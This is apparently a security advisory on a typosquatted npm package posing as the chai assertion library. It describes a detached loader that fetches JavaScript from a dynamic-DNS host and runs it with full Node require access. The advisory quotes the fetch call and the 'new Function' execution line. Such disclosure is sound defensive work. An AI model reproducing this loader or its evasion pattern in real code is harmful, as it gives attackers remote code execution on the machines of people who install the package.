summary: chai typosquat fetches and executes remote JavaScript from a Dynamic DNS endpoint on require
details: The package impersonates the chai assertion library (copying chai's description, homepage chaijs.com, repository chaijs/chai, and file layout) but ships a remote loader. On require(), index.js unconditionally invokes runJobA(), which spawns `node lib/invoker.js` as a detached, stdio-ignored child (index.js:8-15). lib/invoker.js then performs `axios.get('https://statecheck.ddns.net/api/scanner.js')` and passes the response body to `new Function('require', s)(require)` (lib/invoker.js), executing attacker-controlled JavaScript with full Node `require` capability. The detached + unref + ignored-stdio pattern is deliberate evasion: the loader survives parent exit and hides output from the importing process. The destination is a Duck DNS (ddns.net) hostname — mutable attacker infrastructure — so the executed payload can change at any time. Any consumer who installs and imports this package executes arbitrary remote code on their machine.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
